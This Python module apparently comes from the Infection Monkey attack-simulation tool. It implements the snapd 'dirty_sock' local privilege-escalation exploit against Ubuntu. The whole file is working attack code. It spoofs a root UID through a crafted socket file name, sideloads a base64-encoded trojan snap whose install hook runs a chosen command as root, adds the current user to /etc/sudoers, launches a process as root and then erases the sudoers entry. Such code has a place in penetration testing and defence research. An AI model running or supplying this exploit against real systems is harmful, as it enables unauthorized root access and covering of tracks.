"""
    Implementation is based on snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)
    https://github.com/Dhayalanb/Snapd-V2
    Vulnerable snapd versions <=2.37 and If your snapd version has a reference to something like an Ubuntu version number appended to it (example: 2.34.2ubuntu0.1 or 2.35.5+18.10.1) It is patched
"""
import os
import time
import base64
import string
import socket
import random
import subprocess
from logging import getLogger
from infection_monkey.pe.actions import HostPrivExploiter
from infection_monkey.model import REMOVE_LASTLINE, ADDUSER_TO_SUDOERS
from infection_monkey.pe.actions.tools import check_if_sudoer, shell, check_system, check_running

LOG = getLogger(__name__)

__author__ = "D3fa1t"

APPEND_COMMENT = " #"
SLEEP = 5   # in sec

"""
TROJAN_BASE_SNAP contains a simple snap application with an install hook which takes the cmd from the user 
and if the exploit is successful, then the cmd is run as root 

`BQUF` is a place holder which would later be replace by the cmd that needs to be run as root
"""

TROJAN_BASE_SNAP = ('''
aHNxcwcAAACe5/ZcAAACAAEAAAABABEA6wEBAAQAAADYAAAAAAAAAEQHAAAAAAAAPAcAAAAAAAD/
/////////0EFAAAAAAAAOwYAAAAAAADsBgAAAAAAAC4HAAAAAAAAIyEvYmluL2Jhc2gKCnRvdWNo
IC9ldGMvUE9DSEFIQSAjQUF''' + 'BQUF' * 340 + '''BQQpuYW1lOiBkaXJ0eS1zb2NrCnZlcnNpb246ICcwLjEnCnN1bW1hcnk6IEVt
cHR5IHNuYXAsIHVzZWQgZm9yIGV4cGxvaXQKZGVzY3JpcHRpb246ICdTZWUgaHR0cHM6Ly9naXRo
dWIuY29tL2luaXRzdHJpbmcvZGlydHlfc29jawoKICAnCmFyY2hpdGVjdHVyZXM6Ci0gYW1kNjQK
Y29uZmluZW1lbnQ6IGRldm1vZGUKZ3JhZGU6IGRldmVsCviACQD9AQAAAACX5/ZcAwAAAAAAAAAA
AAAAIgQAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAP////8BAP0BAAAAAO3k9lwCAAAAAAAAAAIA
AAAeAAAAAQAAAAIAtAEAAAAA+Ln1XAQAAAAAAAAAAAAAACIEAAC/AAAAAQD9AQAAAAD4ufVcAQAA
AAAAAAADAAAALQAbAAcAAAABAP0BAAAAAPnk9lwGAAAAAAAAAAIAAAAeAEUABQAAAAEA/QEAAAAA
+Ln1XAUAAAAAAAAAAwAAABwAYAAHAAAAAQD9AQAAAAD4ufVcBwAAAAAAAAAEAAAAJwB5AAgAAACd
gAAAAAAAAAAAAwAAAAAAAAACAAYAaW5zdGFsbAEAAAAAAAAAAgAAADgAAAABAAQAaG9va3NYAAIA
AgAIAHNuYXAueWFtbAAAAAAAAAAAAwAAAAAAAAACAAYAaW5zdGFsbAAAAAAAAAAABgAAAJgAAAAB
AAQAaG9va3MBAAAAAAAAAAEAAAB4AAAAAQADAG1ldGG4AAQAAQADAHNuYXAQgGAAAAAAAAAA4QQA
AQAAAADaBgAAAAAAADiAeAAAAAAAAAA4AAAAAAAAAAAAAAAAAAAAWAAAAAAAAAC4AAAAAAAAAJgA
AAAAAAAA2AAAAAAAAAD0BgAAAAAAAASA6AMAADYH'''+'A'*2990 + '==')


def create_sockfile():
    """
    Generates a random socket file name to use
    This is where we slip on the dirty sock. This makes its way into the
    UNIX AF_SOCKET's peer data, which is parsed in an insecure fashion
    by snapd's ucrednet.go file, allowing us to overwrite the UID variable.
    """
    alphabet = string.ascii_lowercase
    random_string = ''.join(random.choice(alphabet) for _ in range(10))
    dirty_sock = ';uid=0;'
    sockfile = '/tmp/' + random_string + dirty_sock
    LOG.info("Slipped dirty sock on random socket file: " + sockfile)
    return sockfile


def bind_sock(sockfile):
    """
    Binds to a local file.
    This exploit only works if we also BIND to the socket after creating
    it, as we need to inject the dirty sock as a remote peer in the
    socket's ancillary data.
    """
    LOG.info("Binding to socket file...")
    try:
        client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client_sock.bind(sockfile)
    except socket.error as e:
        LOG.error('Failed to bind to the socket')
        return False

    # Connect to the snap daemon
    try:
        client_sock.connect('/run/snapd.socket')
    except socket.error as e:
        LOG.error('Failed to connect to snapd.socket! The service snapd is not running')
        return False

    return client_sock


def delete_snap(client_sock):
    """
    Deletes the trojan snap, if installed
    """
    post_payload = ('{"action": "remove",'
                    ' "snaps": ["dirty-sock"]}')
    http_req = ('POST /v2/snaps HTTP/1.1\r\n'
                'Host: localhost\r\n'
                'Content-Type: application/json\r\n'
                'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n'
                + post_payload)

    # Send our payload to the snap API
    LOG.info("[+] Deleting trojan snap (and sleeping 5 seconds)...")
    client_sock.sendall(http_req.encode("utf-8"))

    # Receive the data and extract the JSON
    http_reply = client_sock.recv(8192).decode("utf-8")

    # Exit on probably-not-vulnerable
    if '"status":"Unauthorized"' in http_reply:
        LOG.info("[!] System may not be vulnerable, here is the API reply:\n\n")
        # LOG.info(http_reply) debug output
        return False

    # Exit on failure
    if 'status-code":202' not in http_reply:
        LOG.info("[!] Did not work, here is the API reply:\n\n")
        # LOG.info(http_reply) debug output
        return False

    # We sleep to allow the API command to complete, otherwise the install
    # may fail.
    time.sleep(SLEEP)
    return True


def install_snap(client_sock, trojan_snap):
    """Sideloads the trojan snap"""

    # Decode the base64 from above back into bytes
    blob = base64.b64decode(trojan_snap)

    # Configure the multi-part form upload boundary here:
    boundary = '------------------------f8c156143a1caf97'

    # Construct the POST payload for the /v2/snap API, per the instructions
    # here: https://github.com/snapcore/snapd/wiki/REST-API
    # This follows the 'sideloading' process.
    post_payload = '''
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="devmode"

true
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="snap"; filename="snap.snap"
Content-Type: application/octet-stream

''' + blob.decode('latin-1') + '''
--------------------------f8c156143a1caf97--'''

    # Multi-part forum uploads are weird. First, we post the headers
    # and wait for an HTTP 100 reply. THEN we can send the payload.
    http_req1 = ('POST /v2/snaps HTTP/1.1\r\n'
                 'Host: localhost\r\n'
                 'Content-Type: multipart/form-data; boundary='
                 + boundary + '\r\n'
                 'Expect: 100-continue\r\n'
                 'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n')

    # Send the headers to the snap API
    LOG.info("[+] Installing the trojan snap (and sleeping 8 seconds)...")
    client_sock.sendall(http_req1.encode("utf-8"))

    # Receive the initial HTTP/1.1 100 Continue reply
    http_reply = client_sock.recv(8192).decode("utf-8")

    if 'HTTP/1.1 100 Continue' not in http_reply:
        LOG.info("[!] Error starting POST conversation, here is the reply:\n")
        # LOG.info(http_reply) debug output
        return False

    # Now we can send the payload
    http_req2 = post_payload
    client_sock.sendall(http_req2.encode("latin-1"))

    # Receive the data and extract the JSON
    http_reply = client_sock.recv(8192).decode("utf-8")

    # Exit on failure
    if 'status-code":202' not in http_reply:
        LOG.info("[!] Did not work, here is the API reply:\n\n")
        LOG.info(http_reply) #debug output
        return False

    # Sleep to allow time for the snap to install correctly. Otherwise,
    # The uninstall that follows will fail, leaving unnecessary traces
    # on the machine.

    time.sleep(8)
    return True


def run_command_as_root(command):
    """
    This function takes in the command and runs them as root
    if the pe is successful
    :param command: Command to be run as root
    :return: True if the Pe is successful
    """
    global TROJAN_BASE_SNAP
    command = command + APPEND_COMMENT
    index = 108 + len(command)
    trojan_base_snap_decode = TROJAN_BASE_SNAP.decode('base64')

    # Create a snap application with out command as the install hook
    trojan_snap = base64.b64encode("".join(
        (trojan_base_snap_decode[:108], command, trojan_base_snap_decode[index:])))

    # Create a random name for the dirty socket file
    sockfile = create_sockfile()

    # Bind the dirty socket to the snapdapi
    client_sock = bind_sock(sockfile)
    if not client_sock:
        return False

    # Delete trojan snap, in case there was a previous install attempt
    if not delete_snap(client_sock):
        return False

    # Install the trojan snap, which has an install hook that creates a user
    if not install_snap(client_sock, trojan_snap):
        return False

    # Delete the trojan snap
    if not delete_snap(client_sock):
        return False

    LOG.info("Command Executed Successfully \n")
    return True


class SnapdExploiter(HostPrivExploiter):
    def __init__(self):
        self.file_path = ""
        self.file_name = ""
        self.runnableDistro = ("ubuntu", "linux")

    def try_priv_esc(self, command_line):
        """
        The function takes in the command line to run the monkey as an argument
        and tries to run the monkey as a root user.
        :param command_line: The command line to run the monkey in the format {dest_path  MONKEY_ARG  monkey_options}
        :return: True if the pe is successful
        """
        # Check if the exploit can be tried on this distro
        if not check_system(self.runnableDistro):
            return False

        self.file_path = command_line.split(' ')[0]
        self.file_name = self.file_path.split('/')[-1]

        # get the current user name
        whoami = shell("whoami")

        # Error reading off shell
        if not whoami:
            return False

        # we create a temp file in /tmp as root to verify command exec as root
        alphabet = string.ascii_lowercase
        filename = ''.join(random.choice(alphabet) for _ in range(10))
        operation = 'touch /tmp/'

        # add the user to the sudo group
        add_user_to_sudoers = ADDUSER_TO_SUDOERS % {'user_name': whoami}

        if run_command_as_root(add_user_to_sudoers):

            # check if exploit is successful by touching a file and checking the owner
            file_path = "/tmp/%(filename)s"
            touch_file = "sudo " + operation + filename
            shell(touch_file)
            LOG.info("Touching the file %s" % touch_file)
            time.sleep(1)  # sleep un-till the file is created
            if not check_if_sudoer(file_path %{'filename':filename}):
                LOG.info("Either file doesn't exist or is not owned by root!")
                return False
        else:
            LOG.info("Snapd Privilege escalation was not successful!")
            return False

        LOG.info("The command that is executed as root is %s" % add_user_to_sudoers)
        # now run the monkey as root

        command_line = "sudo " + command_line
        monkey_process = subprocess.Popen(command_line, shell=True,
                                          stdin=None, stdout=None, stderr=None,
                                          close_fds=True, creationflags=0)

        LOG.info("Executed monkey process as root with (PID=%d) with command line: %s",
                 monkey_process.pid, command_line)

        # now remove the user from sudoers
        LOG.info("Removing the current user %s from the sudoers list", whoami)

        remove_from_sudoers = REMOVE_LASTLINE % {'file_name' : "/etc/sudoers"}
        subprocess.Popen(remove_from_sudoers, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True,
                         creationflags=0)
        return True
